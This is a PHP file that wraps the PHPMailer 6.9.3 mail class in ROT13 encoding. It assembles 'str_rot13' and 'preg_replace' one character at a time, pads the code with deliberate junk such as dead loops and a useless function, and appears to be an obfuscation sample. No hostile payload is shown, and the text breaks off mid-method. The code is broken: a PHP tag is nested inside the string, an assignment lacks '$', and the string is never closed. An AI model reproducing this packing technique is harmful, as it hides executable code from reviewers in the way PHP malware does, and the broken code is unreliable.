<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * CUCZnvyre - CUC rznvy perngvba naq genafcbeg pynff.
 * CUC Irefvba 5.5.
 *
 * @frr uggcf://tvguho.pbz/CUCZnvyre/CUCZnvyre/ Gur CUCZnvyre TvgUho cebwrpg
 *
 * @nhgube    Znephf Obvagba (Flapueb/pbbyoeh) <cucznvyre@flapuebzrqvn.pb.hx>
 * @nhgube    Wvz Wntvryfxv (wvzwnt) <wvzwnt@tznvy.pbz>
 * @nhgube    Naql Ceribfg (pbqrjbekgrpu) <pbqrjbekgrpu@hfref.fbheprsbetr.arg>
 * @nhgube    Oerag E. Zngmryyr (bevtvany sbhaqre)
 * @pbclevtug 2012 - 2020 Znephf Obvagba
 * @pbclevtug 2010 - 2012 Wvz Wntvryfxv
 * @pbclevtug 2004 - 2009 Naql Ceribfg
 * @yvprafr   uggcf://jjj.tah.bet/yvprafrf/byq-yvprafrf/ytcy-2.1.ugzy TAH Yrffre Trareny Choyvp Yvprafr
 * @abgr      Guvf cebtenz vf qvfgevohgrq va gur ubcr gung vg jvyy or hfrshy - JVGUBHG
 * NAL JNEENAGL; jvgubhg rira gur vzcyvrq jneenagl bs ZREPUNAGNOVYVGL be
 * SVGARFF SBE N CNEGVPHYNE CHECBFR.
 */

anzrfcnpr CUCZnvyre\CUCZnvyre;

/**
 * CUCZnvyre - CUC rznvy perngvba naq genafcbeg pynff.
 *
 * @nhgube Znephf Obvagba (Flapueb/pbbyoeh) <cucznvyre@flapuebzrqvn.pb.hx>
 * @nhgube Wvz Wntvryfxv (wvzwnt) <wvzwnt@tznvy.pbz>
 * @nhgube Naql Ceribfg (pbqrjbekgrpu) <pbqrjbekgrpu@hfref.fbheprsbetr.arg>
 * @nhgube Oerag E. Zngmryyr (bevtvany sbhaqre)
 */
pynff CUCZnvyre
{
    pbafg PUNEFRG_NFPVV = 'hf-nfpvv';
    pbafg PUNEFRG_VFB88591 = 'vfb-8859-1';
    pbafg PUNEFRG_HGS8 = 'hgs-8';

    pbafg PBAGRAG_GLCR_CYNVAGRKG = 'grkg/cynva';
    pbafg PBAGRAG_GLCR_GRKG_PNYRAQNE = 'grkg/pnyraqne';
    pbafg PBAGRAG_GLCR_GRKG_UGZY = 'grkg/ugzy';
    pbafg PBAGRAG_GLCR_ZHYGVCNEG_NYGREANGVIR = 'zhygvcneg/nygreangvir';
    pbafg PBAGRAG_GLCR_ZHYGVCNEG_ZVKRQ = 'zhygvcneg/zvkrq';
    pbafg PBAGRAG_GLCR_ZHYGVCNEG_ERYNGRQ = 'zhygvcneg/eryngrq';

    pbafg RAPBQVAT_7OVG = '7ovg';
    pbafg RAPBQVAT_8OVG = '8ovg';
    pbafg RAPBQVAT_ONFR64 = 'onfr64';
    pbafg RAPBQVAT_OVANEL = 'ovanel';
    pbafg RAPBQVAT_DHBGRQ_CEVAGNOYR = 'dhbgrq-cevagnoyr';

    pbafg RAPELCGVBA_FGNEGGYF = 'gyf';
    pbafg RAPELCGVBA_FZGCF = 'ffy';

    pbafg VPNY_ZRGUBQ_ERDHRFG = 'ERDHRFG';
    pbafg VPNY_ZRGUBQ_CHOYVFU = 'CHOYVFU';
    pbafg VPNY_ZRGUBQ_ERCYL = 'ERCYL';
    pbafg VPNY_ZRGUBQ_NQQ = 'NQQ';
    pbafg VPNY_ZRGUBQ_PNAPRY = 'PNAPRY';
    pbafg VPNY_ZRGUBQ_ERSERFU = 'ERSERFU';
    pbafg VPNY_ZRGUBQ_PBHAGRE = 'PBHAGRE';
    pbafg VPNY_ZRGUBQ_QRPYVARPBHAGRE = 'QRPYVARPBHAGRE';

    /**
     * Rznvy cevbevgl.
     * Bcgvbaf: ahyy (qrsnhyg), 1 = Uvtu, 3 = Abezny, 5 = ybj.
     * Jura ahyy, gur urnqre vf abg frg ng nyy.
     *
     * @ine vag|ahyy
     */
    choyvp $Cevbevgl;

    /**
     * Gur punenpgre frg bs gur zrffntr.
     *
     * @ine fgevat
     */
    choyvp $PuneFrg = frys::PUNEFRG_VFB88591;

    /**
     * Gur ZVZR Pbagrag-glcr bs gur zrffntr.
     *
     * @ine fgevat
     */
    choyvp $PbagragGlcr = frys::PBAGRAG_GLCR_CYNVAGRKG;

    /**
     * Gur zrffntr rapbqvat.
     * Bcgvbaf: \"8ovg\", \"7ovg\", \"ovanel\", \"onfr64\", naq \"dhbgrq-cevagnoyr\".
     *
     * @ine fgevat
     */
    choyvp $Rapbqvat = frys::RAPBQVAT_8OVG;

    /**
     * Ubyqf gur zbfg erprag znvyre reebe zrffntr.
     *
     * @ine fgevat
     */
    choyvp $ReebeVasb = '';

    /**
     * Gur Sebz rznvy nqqerff sbe gur zrffntr.
     *
     * @ine fgevat
     */
    choyvp $Sebz = '';

    /**
     * Gur Sebz anzr bs gur zrffntr.
     *
     * @ine fgevat
     */
    choyvp $SebzAnzr = '';

    /**
     * Gur rairybcr fraqre bs gur zrffntr.
     * Guvf jvyy hfhnyyl or ghearq vagb n Erghea-Cngu urnqre ol gur erprvire,
     * naq vf gur nqqerff gung obhaprf jvyy or frag gb.
     * Vs abg rzcgl, jvyy or cnffrq ivn `-s` gb fraqznvy be nf gur 'ZNVY SEBZ' inyhr bire FZGC.
     *
     * @ine fgevat
     */
    choyvp $Fraqre = '';

    /**
     * Gur Fhowrpg bs gur zrffntr.
     *
     * @ine fgevat
     */
    choyvp $Fhowrpg = '';

    /**
     * Na UGZY be cynva grkg zrffntr obql.
     * Vs UGZY gura pnyy vfUGZY(gehr).
     *
     * @ine fgevat
     */
    choyvp $Obql = '';

    /**
     * Gur cynva-grkg zrffntr obql.
     * Guvf obql pna or ernq ol znvy pyvragf gung qb abg unir UGZY rznvy
     * pncnovyvgl fhpu nf zhgg & Rhqben.
     * Pyvragf gung pna ernq UGZY jvyy ivrj gur abezny Obql.
     *
     * @ine fgevat
     */
    choyvp $NygObql = '';

    /**
     * Na vPny zrffntr cneg obql.
     * Bayl fhccbegrq va fvzcyr nyg be nyg_vayvar zrffntr glcrf
     * Gb trarengr vPny rirag fgehpgherf, hfr pynffrf yvxr RnflCrnflVPF be vPnyperngbe.
     *
     * @frr uggcf://xvtxbafhyg.fr/vPnyperngbe/
     *
     * @ine fgevat
     */
    choyvp $Vpny = '';

    /**
     * Inyhr-neenl bs \"zrgubq\" va Pbagragglcr urnqre \"grkg/pnyraqne\"
     *
     * @ine fgevat[]
     */
    cebgrpgrq fgngvp $VpnyZrgubqf = [
        frys::VPNY_ZRGUBQ_ERDHRFG,
        frys::VPNY_ZRGUBQ_CHOYVFU,
        frys::VPNY_ZRGUBQ_ERCYL,
        frys::VPNY_ZRGUBQ_NQQ,
        frys::VPNY_ZRGUBQ_PNAPRY,
        frys::VPNY_ZRGUBQ_ERSERFU,
        frys::VPNY_ZRGUBQ_PBHAGRE,
        frys::VPNY_ZRGUBQ_QRPYVARPBHAGRE,
    ];

    /**
     * Gur pbzcyrgr pbzcvyrq ZVZR zrffntr obql.
     *
     * @ine fgevat
     */
    cebgrpgrq $ZVZRObql = '';

    /**
     * Gur pbzcyrgr pbzcvyrq ZVZR zrffntr urnqref.
     *
     * @ine fgevat
     */
    cebgrpgrq $ZVZRUrnqre = '';

    /**
     * Rkgen urnqref gung perngrUrnqre() qbrfa'g sbyq va.
     *
     * @ine fgevat
     */
    cebgrpgrq $znvyUrnqre = '';

    /**
     * Jbeq-jenc gur zrffntr obql gb guvf ahzore bs punef.
     * Frg gb 0 gb abg jenc. N hfrshy inyhr urer vf 78, sbe ESP2822 frpgvba 2.1.1 pbzcyvnapr.
     *
     * @frr fgngvp::FGQ_YVAR_YRATGU
     *
     * @ine vag
     */
    choyvp $JbeqJenc = 0;

    /**
     * Juvpu zrgubq gb hfr gb fraq znvy.
     * Bcgvbaf: \"znvy\", \"fraqznvy\", be \"fzgc\".
     *
     * @ine fgevat
     */
    choyvp $Znvyre = 'znvy';

    /**
     * Gur cngu gb gur fraqznvy cebtenz.
     *
     * @ine fgevat
     */
    choyvp $Fraqznvy = '/hfe/fova/fraqznvy';

    /**
     * Jurgure znvy() hfrf n shyyl fraqznvy-pbzcngvoyr ZGN.
     * Bar juvpu fhccbegf fraqznvy'f \"-bv -s\" bcgvbaf.
     *
     * @ine obby
     */
    choyvp $HfrFraqznvyBcgvbaf = gehr;

    /**
     * Gur rznvy nqqerff gung n ernqvat pbasvezngvba fubhyq or frag gb, nyfb xabja nf ernq erprvcg.
     *
     * @ine fgevat
     */
    choyvp $PbasvezErnqvatGb = '';

    /**
     * Gur ubfganzr gb hfr va gur Zrffntr-VQ urnqre naq nf qrsnhyg URYB fgevat.
     * Vs rzcgl, CUCZnvyre nggrzcgf gb svaq bar jvgu, va beqre,
     * $_FREIRE['FREIRE_ANZR'], trgubfganzr(), cuc_hanzr('a'), be gur inyhr
     * 'ybpnyubfg.ybpnyqbznva'.
     *
     * @frr CUCZnvyre::$Uryb
     *
     * @ine fgevat
     */
    choyvp $Ubfganzr = '';

    /**
     * Na VQ gb or hfrq va gur Zrffntr-VQ urnqre.
     * Vs rzcgl, n havdhr vq jvyy or trarengrq.
     * Lbh pna frg lbhe bja, ohg vg zhfg or va gur sbezng \"<vq@qbznva>\",
     * nf qrsvarq va ESP5322 frpgvba 3.6.4 be vg jvyy or vtaberq.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp5322#frpgvba-3.6.4
     *
     * @ine fgevat
     */
    choyvp $ZrffntrVQ = '';

    /**
     * Gur zrffntr Qngr gb or hfrq va gur Qngr urnqre.
     * Vs rzcgl, gur pheerag qngr jvyy or nqqrq.
     *
     * @ine fgevat
     */
    choyvp $ZrffntrQngr = '';

    /**
     * FZGC ubfgf.
     * Rvgure n fvatyr ubfganzr be zhygvcyr frzvpbyba-qryvzvgrq ubfganzrf.
     * Lbh pna nyfb fcrpvsl n qvssrerag cbeg
     * sbe rnpu ubfg ol hfvat guvf sbezng: [ubfganzr:cbeg]
     * (r.t. \"fzgc1.rknzcyr.pbz:25;fzgc2.rknzcyr.pbz\").
     * Lbh pna nyfb fcrpvsl rapelcgvba glcr, sbe rknzcyr:
     * (r.t. \"gyf://fzgc1.rknzcyr.pbz:587;ffy://fzgc2.rknzcyr.pbz:465\").
     * Ubfgf jvyy or gevrq va beqre.
     *
     * @ine fgevat
     */
    choyvp $Ubfg = 'ybpnyubfg';

    /**
     * Gur qrsnhyg FZGC freire cbeg.
     *
     * @ine vag
     */
    choyvp $Cbeg = 25;

    /**
     * Gur FZGC URYB/RUYB anzr hfrq sbe gur FZGC pbaarpgvba.
     * Qrsnhyg vf $Ubfganzr. Vs $Ubfganzr vf rzcgl, CUCZnvyre nggrzcgf gb svaq
     * bar jvgu gur fnzr zrgubq qrfpevorq nobir sbe $Ubfganzr.
     *
     * @frr CUCZnvyre::$Ubfganzr
     *
     * @ine fgevat
     */
    choyvp $Uryb = '';

    /**
     * Jung xvaq bs rapelcgvba gb hfr ba gur FZGC pbaarpgvba.
     * Bcgvbaf: '', fgngvp::RAPELCGVBA_FGNEGGYF, be fgngvp::RAPELCGVBA_FZGCF.
     *
     * @ine fgevat
     */
    choyvp $FZGCFrpher = '';

    /**
     * Jurgure gb ranoyr GYF rapelcgvba nhgbzngvpnyyl vs n freire fhccbegf vg,
     * rira vs `FZGCFrpher` vf abg frg gb 'gyf'.
     * Or njner gung va CUC >= 5.6 guvf erdhverf gung gur freire'f pregvsvpngrf ner inyvq.
     *
     * @ine obby
     */
    choyvp $FZGCNhgbGYF = gehr;

    /**
     * Jurgure gb hfr FZGC nhguragvpngvba.
     * Hfrf gur Hfreanzr naq Cnffjbeq cebcregvrf.
     *
     * @frr CUCZnvyre::$Hfreanzr
     * @frr CUCZnvyre::$Cnffjbeq
     *
     * @ine obby
     */
    choyvp $FZGCNhgu = snyfr;

    /**
     * Bcgvbaf neenl cnffrq gb fgernz_pbagrkg_perngr jura pbaarpgvat ivn FZGC.
     *
     * @ine neenl
     */
    choyvp $FZGCBcgvbaf = [];

    /**
     * FZGC hfreanzr.
     *
     * @ine fgevat
     */
    choyvp $Hfreanzr = '';

    /**
     * FZGC cnffjbeq.
     *
     * @ine fgevat
     */
    choyvp $Cnffjbeq = '';

    /**
     * FZGC nhguragvpngvba glcr. Bcgvbaf ner PENZ-ZQ5, YBTVA, CYNVA, KBNHGU2.
     * Vs abg fcrpvsvrq, gur svefg bar sebz gung yvfg gung gur freire fhccbegf jvyy or fryrpgrq.
     *
     * @ine fgevat
     */
    choyvp $NhguGlcr = '';

    /**
     * FZGC FZGCKPyvrag pbzznaq nggevohgrf
     *
     * @ine neenl
     */
    cebgrpgrq $FZGCKPyvrag = [];

    /**
     * Na vzcyrzragngvba bs gur CUCZnvyre BNhguGbxraCebivqre vagresnpr.
     *
     * @ine BNhguGbxraCebivqre
     */
    cebgrpgrq $bnhgu;

    /**
     * Gur FZGC freire gvzrbhg va frpbaqf.
     * Qrsnhyg bs 5 zvahgrf (300frp) vf sebz ESP2821 frpgvba 4.5.3.2.
     *
     * @ine vag
     */
    choyvp $Gvzrbhg = 300;

    /**
     * Pbzzn frcnengrq yvfg bs QFA abgvsvpngvbaf
     * 'ARIRE' haqre ab pvephzfgnaprf n QFA zhfg or erghearq gb gur fraqre.
     *         Vs lbh hfr ARIRE nyy bgure abgvsvpngvbaf jvyy or vtaberq.
     * 'FHPPRFF' jvyy abgvsl lbh jura lbhe znvy unf neevirq ng vgf qrfgvangvba.
     * 'SNVYHER' jvyy neevir vs na reebe bppheerq qhevat qryvirel.
     * 'QRYNL'   jvyy abgvsl lbh vs gurer vf na hahfhny qrynl va qryvirel, ohg gur npghny
     *           qryvirel'f bhgpbzr (fhpprff be snvyher) vf abg lrg qrpvqrq.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp3461.ugzy#frpgvba-4.1 sbe zber vasbezngvba nobhg ABGVSL
     */
    choyvp $qfa = '';

    /**
     * FZGC pynff qroht bhgchg zbqr.
     * Qroht bhgchg yriry.
     * Bcgvbaf:
     * @frr FZGC::QROHT_BSS: Ab bhgchg
     * @frr FZGC::QROHT_PYVRAG: Pyvrag zrffntrf
     * @frr FZGC::QROHT_FREIRE: Pyvrag naq freire zrffntrf
     * @frr FZGC::QROHT_PBAARPGVBA: Nf FREIRE cyhf pbaarpgvba fgnghf
     * @frr FZGC::QROHT_YBJYRIRY: Abvfl, ybj-yriry qngn bhgchg, eneryl arrqrq
     *
     * @frr FZGC::$qb_qroht
     *
     * @ine vag
     */
    choyvp $FZGCQroht = 0;

    /**
     * Ubj gb unaqyr qroht bhgchg.
     * Bcgvbaf:
     * * `rpub` Bhgchg cynva-grkg nf-vf, nccebcevngr sbe PYV
     * * `ugzy` Bhgchg rfpncrq, yvar oernxf pbairegrq gb `<oe>`, nccebcevngr sbe oebjfre bhgchg
     * * `reebe_ybt` Bhgchg gb reebe ybt nf pbasvtherq va cuc.vav
     * Ol qrsnhyg CUCZnvyre jvyy hfr `rpub` vs eha sebz n `pyv` be `pyv-freire` FNCV, `ugzy` bgurejvfr.
     * Nygreangviryl, lbh pna cebivqr n pnyynoyr rkcrpgvat gjb cnenzf: n zrffntr fgevat naq gur qroht yriry:
     *
     * ```cuc
     * $znvy->Qrohtbhgchg = shapgvba($fge, $yriry) {rpub \"qroht yriry $yriry; zrffntr: $fge\";};
     * ```
     *
     * Nygreangviryl, lbh pna cnff va na vafgnapr bs n CFE-3 pbzcngvoyr ybttre, gubhtu bayl `qroht`
     * yriry bhgchg vf hfrq:
     *
     * ```cuc
     * $znvy->Qrohtbhgchg = arj zlCfe3Ybttre;
     * ```
     *
     * @frr FZGC::$Qrohtbhgchg
     *
     * @ine fgevat|pnyynoyr|\Cfe\Ybt\YbttreVagresnpr
     */
    choyvp $Qrohtbhgchg = 'rpub';

    /**
     * Jurgure gb xrrc gur FZGC pbaarpgvba bcra nsgre rnpu zrffntr.
     * Vs guvf vf frg gb gehr gura gur pbaarpgvba jvyy erznva bcra nsgre n fraq,
     * naq pybfvat gur pbaarpgvba jvyy erdhver na rkcyvpvg pnyy gb fzgcPybfr().
     * Vg'f n tbbq vqrn gb hfr guvf vs lbh ner fraqvat zhygvcyr zrffntrf nf vg erqhprf bireurnq.
     * Frr gur znvyvat yvfg rknzcyr sbe ubj gb hfr vg.
     *
     * @ine obby
     */
    choyvp $FZGCXrrcNyvir = snyfr;

    /**
     * Jurgure gb fcyvg zhygvcyr gb nqqerffrf vagb zhygvcyr zrffntrf
     * be fraq gurz nyy va bar zrffntr.
     * Bayl fhccbegrq va `znvy` naq `fraqznvy` genafcbegf, abg va FZGC.
     *
     * @ine obby
     *
     * @qrcerpngrq 6.0.0 CUCZnvyre vfa'g n znvyvat yvfg znantre!
     */
    choyvp $FvatyrGb = snyfr;

    /**
     * Fgbentr sbe nqqerffrf jura FvatyrGb vf ranoyrq.
     *
     * @ine neenl
     */
    cebgrpgrq $FvatyrGbNeenl = [];

    /**
     * Jurgure gb trarengr IREC nqqerffrf ba fraq.
     * Bayl nccyvpnoyr jura fraqvat ivn FZGC.
     *
     * @frr uggcf://ra.jvxvcrqvn.bet/jvxv/Inevnoyr_rairybcr_erghea_cngu
     * @frr uggcf://jjj.cbfgsvk.bet/IREC_ERNQZR.ugzy Cbfgsvk IREC vasb
     *
     * @ine obby
     */
    choyvp $qb_irec = snyfr;

    /**
     * Jurgure gb nyybj fraqvat zrffntrf jvgu na rzcgl obql.
     *
     * @ine obby
     */
    choyvp $NyybjRzcgl = snyfr;

    /**
     * QXVZ fryrpgbe.
     *
     * @ine fgevat
     */
    choyvp $QXVZ_fryrpgbe = '';

    /**
     * QXVZ Vqragvgl.
     * Hfhnyyl gur rznvy nqqerff hfrq nf gur fbhepr bs gur rznvy.
     *
     * @ine fgevat
     */
    choyvp $QXVZ_vqragvgl = '';

    /**
     * QXVZ cnffcuenfr.
     * Hfrq vs lbhe xrl vf rapelcgrq.
     *
     * @ine fgevat
     */
    choyvp $QXVZ_cnffcuenfr = '';

    /**
     * QXVZ fvtavat qbznva anzr.
     *
     * @rknzcyr 'rknzcyr.pbz'
     *
     * @ine fgevat
     */
    choyvp $QXVZ_qbznva = '';

    /**
     * QXVZ Pbcl urnqre svryq inyhrf sbe qvntabfgvp hfr.
     *
     * @ine obby
     */
    choyvp $QXVZ_pbclUrnqreSvryqf = gehr;

    /**
     * QXVZ Rkgen fvtavat urnqref.
     *
     * @rknzcyr ['Yvfg-Hafhofpevor', 'Yvfg-Uryc']
     *
     * @ine neenl
     */
    choyvp $QXVZ_rkgenUrnqref = [];

    /**
     * QXVZ cevingr xrl svyr cngu.
     *
     * @ine fgevat
     */
    choyvp $QXVZ_cevingr = '';

    /**
     * QXVZ cevingr xrl fgevat.
     *
     * Vs frg, gnxrf cerprqrapr bire `$QXVZ_cevingr`.
     *
     * @ine fgevat
     */
    choyvp $QXVZ_cevingr_fgevat = '';

    /**
     * Pnyyonpx Npgvba shapgvba anzr.
     *
     * Gur shapgvba gung unaqyrf gur erfhyg bs gur fraq rznvy npgvba.
     * Vg vf pnyyrq bhg ol fraq() sbe rnpu rznvy frag.
     *
     * Inyhr pna or nal cuc pnyynoyr: uggcf://jjj.cuc.arg/vf_pnyynoyr
     *
     * Cnenzrgref:
     *   obby $erfhyg           erfhyg bs gur fraq npgvba
     *   neenl   $gb            rznvy nqqerffrf bs gur erpvcvragf
     *   neenl   $pp            pp rznvy nqqerffrf
     *   neenl   $opp           opp rznvy nqqerffrf
     *   fgevat  $fhowrpg       gur fhowrpg
     *   fgevat  $obql          gur rznvy obql
     *   fgevat  $sebz          rznvy nqqerff bs fraqre
     *   fgevat  $rkgen         rkgen vasbezngvba bs cbffvoyr hfr
     *                          \"fzgc_genafnpgvba_vq' => ynfg fzgc genafnpgvba vq
     *
     * @ine fgevat
     */
    choyvp $npgvba_shapgvba = '';

    /**
     * Jung gb chg va gur K-Znvyre urnqre.
     * Bcgvbaf: Na rzcgl fgevat sbe CUCZnvyre qrsnhyg, juvgrfcnpr/ahyy sbe abar, be n fgevat gb hfr.
     *
     * @ine fgevat|ahyy
     */
    choyvp $KZnvyre = '';

    /**
     * Juvpu inyvqngbe gb hfr ol qrsnhyg jura inyvqngvat rznvy nqqerffrf.
     * Znl or n pnyynoyr gb vawrpg lbhe bja inyvqngbe, ohg gurer ner frireny ohvyg-va inyvqngbef.
     * Gur qrsnhyg inyvqngbe hfrf CUC'f SVYGRE_INYVQNGR_RZNVY svygre_ine bcgvba.
     *
     * @frr CUCZnvyre::inyvqngrNqqerff()
     *
     * @ine fgevat|pnyynoyr
     */
    choyvp fgngvp $inyvqngbe = 'cuc';

    /**
     * Na vafgnapr bs gur FZGC fraqre pynff.
     *
     * @ine FZGC
     */
    cebgrpgrq $fzgc;

    /**
     * Gur neenl bs 'gb' anzrf naq nqqerffrf.
     *
     * @ine neenl
     */
    cebgrpgrq $gb = [];

    /**
     * Gur neenl bs 'pp' anzrf naq nqqerffrf.
     *
     * @ine neenl
     */
    cebgrpgrq $pp = [];

    /**
     * Gur neenl bs 'opp' anzrf naq nqqerffrf.
     *
     * @ine neenl
     */
    cebgrpgrq $opp = [];

    /**
     * Gur neenl bs ercyl-gb anzrf naq nqqerffrf.
     *
     * @ine neenl
     */
    cebgrpgrq $ErcylGb = [];

    /**
     * Na neenl bs nyy xvaqf bs nqqerffrf.
     * Vapyhqrf nyy bs $gb, $pp, $opp.
     *
     * @frr CUCZnvyre::$gb
     * @frr CUCZnvyre::$pp
     * @frr CUCZnvyre::$opp
     *
     * @ine neenl
     */
    cebgrpgrq $nyy_erpvcvragf = [];

    /**
     * Na neenl bs anzrf naq nqqerffrf dhrhrq sbe inyvqngvba.
     * Va fraq(), inyvq naq aba qhcyvpngr ragevrf ner zbirq gb $nyy_erpvcvragf
     * naq bar bs $gb, $pp, be $opp.
     * Guvf neenl vf hfrq bayl sbe nqqerffrf jvgu VQA.
     *
     * @frr CUCZnvyre::$gb
     * @frr CUCZnvyre::$pp
     * @frr CUCZnvyre::$opp
     * @frr CUCZnvyre::$nyy_erpvcvragf
     *
     * @ine neenl
     */
    cebgrpgrq $ErpvcvragfDhrhr = [];

    /**
     * Na neenl bs ercyl-gb anzrf naq nqqerffrf dhrhrq sbe inyvqngvba.
     * Va fraq(), inyvq naq aba qhcyvpngr ragevrf ner zbirq gb $ErcylGb.
     * Guvf neenl vf hfrq bayl sbe nqqerffrf jvgu VQA.
     *
     * @frr CUCZnvyre::$ErcylGb
     *
     * @ine neenl
     */
    cebgrpgrq $ErcylGbDhrhr = [];

    /**
     * Gur neenl bs nggnpuzragf.
     *
     * @ine neenl
     */
    cebgrpgrq $nggnpuzrag = [];

    /**
     * Gur neenl bs phfgbz urnqref.
     *
     * @ine neenl
     */
    cebgrpgrq $PhfgbzUrnqre = [];

    /**
     * Gur zbfg erprag Zrffntr-VQ (vapyhqvat nathyne oenpxrgf).
     *
     * @ine fgevat
     */
    cebgrpgrq $ynfgZrffntrVQ = '';

    /**
     * Gur zrffntr'f ZVZR glcr.
     *
     * @ine fgevat
     */
    cebgrpgrq $zrffntr_glcr = '';

    /**
     * Gur neenl bs ZVZR obhaqnel fgevatf.
     *
     * @ine neenl
     */
    cebgrpgrq $obhaqnel = [];

    /**
     * Gur neenl bs ninvynoyr grkg fgevatf sbe gur pheerag ynathntr.
     *
     * @ine neenl
     */
    cebgrpgrq $ynathntr = [];

    /**
     * Gur ahzore bs reebef rapbhagrerq.
     *
     * @ine vag
     */
    cebgrpgrq $reebe_pbhag = 0;

    /**
     * Gur F/ZVZR pregvsvpngr svyr cngu.
     *
     * @ine fgevat
     */
    cebgrpgrq $fvta_preg_svyr = '';

    /**
     * Gur F/ZVZR xrl svyr cngu.
     *
     * @ine fgevat
     */
    cebgrpgrq $fvta_xrl_svyr = '';

    /**
     * Gur bcgvbany F/ZVZR rkgen pregvsvpngrf (\"PN Punva\") svyr cngu.
     *
     * @ine fgevat
     */
    cebgrpgrq $fvta_rkgenpregf_svyr = '';

    /**
     * Gur F/ZVZR cnffjbeq sbe gur xrl.
     * Hfrq bayl vs gur xrl vf rapelcgrq.
     *
     * @ine fgevat
     */
    cebgrpgrq $fvta_xrl_cnff = '';

    /**
     * Jurgure gb guebj rkprcgvbaf sbe reebef.
     *
     * @ine obby
     */
    cebgrpgrq $rkprcgvbaf = snyfr;

    /**
     * Havdhr VQ hfrq sbe zrffntr VQ naq obhaqnevrf.
     *
     * @ine fgevat
     */
    cebgrpgrq $havdhrvq = '';

    /**
     * Gur CUCZnvyre Irefvba ahzore.
     *
     * @ine fgevat
     */
    pbafg IREFVBA = '6.9.3';

    /**
     * Reebe frirevgl: zrffntr bayl, pbagvahr cebprffvat.
     *
     * @ine vag
     */
    pbafg FGBC_ZRFFNTR = 0;

    /**
     * Reebe frirevgl: zrffntr, yvxryl bx gb pbagvahr cebprffvat.
     *
     * @ine vag
     */
    pbafg FGBC_PBAGVAHR = 1;

    /**
     * Reebe frirevgl: zrffntr, cyhf shyy fgbc, pevgvpny reebe ernpurq.
     *
     * @ine vag
     */
    pbafg FGBC_PEVGVPNY = 2;

    /**
     * Gur FZGC fgnaqneq PEYS yvar oernx.
     * Vs lbh jnag gb punatr yvar oernx sbezng, punatr fgngvp::$YR, abg guvf.
     */
    pbafg PEYS = \"\e\a\";

    /**
     * \"Sbyqvat Juvgr Fcnpr\" n juvgr fcnpr fgevat hfrq sbe yvar sbyqvat.
     */
    pbafg SJF = ' ';

    /**
     * FZGC ESP fgnaqneq yvar raqvat; Pneevntr Erghea, Yvar Srrq.
     *
     * @ine fgevat
     */
    cebgrpgrq fgngvp $YR = frys::PEYS;

    /**
     * Gur znkvzhz yvar yratgu fhccbegrq ol znvy().
     *
     * Onpxtebhaq: znvy() jvyy fbzrgvzrf pbeehcg zrffntrf
     * jvgu urnqref ybatre guna 65 punef, frr #818.
     *
     * @ine vag
     */
    pbafg ZNVY_ZNK_YVAR_YRATGU = 63;

    /**
     * Gur znkvzhz yvar yratgu nyybjrq ol ESP 2822 frpgvba 2.1.1.
     *
     * @ine vag
     */
    pbafg ZNK_YVAR_YRATGU = 998;

    /**
     * Gur ybjre znkvzhz yvar yratgu nyybjrq ol ESP 2822 frpgvba 2.1.1.
     * Guvf yratgu qbrf ABG vapyhqr gur yvar oernx
     * 76 zrnaf gung yvarf jvyy or 77 be 78 punef qrcraqvat ba jurgure
     * gur yvar oernx sbezng vf YS be PEYS; obgu ner inyvq.
     *
     * @ine vag
     */
    pbafg FGQ_YVAR_YRATGU = 76;

    /**
     * Pbafgehpgbe.
     *
     * @cnenz obby $rkprcgvbaf Fubhyq jr guebj rkgreany rkprcgvbaf?
     */
    choyvp shapgvba __pbafgehpg($rkprcgvbaf = ahyy)
    {
        vs (ahyy !== $rkprcgvbaf) {
            $guvf->rkprcgvbaf = (obby) $rkprcgvbaf;
        }
        //Cvpx na nccebcevngr qroht bhgchg sbezng nhgbzngvpnyyl
        $guvf->Qrohtbhgchg = (fgecbf(CUC_FNCV, 'pyv') !== snyfr ? 'rpub' : 'ugzy');
    }

    /**
     * Qrfgehpgbe.
     */
    choyvp shapgvba __qrfgehpg()
    {
        //Pybfr nal bcra FZGC pbaarpgvba avpryl
        $guvf->fzgcPybfr();
    }

    /**
     * Pnyy znvy() va n fnsr_zbqr-njner snfuvba.
     * Nyfb, hayrff fraqznvy_cngu cbvagf gb fraqznvy (be fbzrguvat gung
     * pynvzf gb or fraqznvy), qba'g cnff cnenzf (abg n cresrpg svk,
     * ohg vg jvyy qb).
     *
     * @cnenz fgevat      $gb      Gb
     * @cnenz fgevat      $fhowrpg Fhowrpg
     * @cnenz fgevat      $obql    Zrffntr Obql
     * @cnenz fgevat      $urnqre  Nqqvgvbany Urnqre(f)
     * @cnenz fgevat|ahyy $cnenzf  Cnenzf
     *
     * @erghea obby
     */
    cevingr shapgvba znvyCnffgueh($gb, $fhowrpg, $obql, $urnqre, $cnenzf)
    {
        //Purpx bireybnqvat bs znvy shapgvba gb nibvq qbhoyr-rapbqvat
        vs ((vag)vav_trg('zofgevat.shap_bireybnq') & 1) { // cucpf:vtaber CUCPbzcngvovyvgl.VavQverpgvirf.ErzbirqVavQverpgvirf.zofgevat_shap_bireybnqQrcerpngrq
            $fhowrpg = $guvf->frpherUrnqre($fhowrpg);
        } ryfr {
            $fhowrpg = $guvf->rapbqrUrnqre($guvf->frpherUrnqre($fhowrpg));
        }
        //Pnyyvat znvy() jvgu ahyy cnenzf oernxf
        $guvf->rqroht('Fraqvat jvgu znvy()');
        $guvf->rqroht('Fraqznvy cngu: ' . vav_trg('fraqznvy_cngu'));
        $guvf->rqroht(\"Rairybcr fraqre: {$guvf->Fraqre}\");
        $guvf->rqroht(\"Gb: {$gb}\");
        $guvf->rqroht(\"Fhowrpg: {$fhowrpg}\");
        $guvf->rqroht(\"Urnqref: {$urnqre}\");
        vs (!$guvf->HfrFraqznvyBcgvbaf || ahyy === $cnenzf) {
            $erfhyg = @znvy($gb, $fhowrpg, $obql, $urnqre);
        } ryfr {
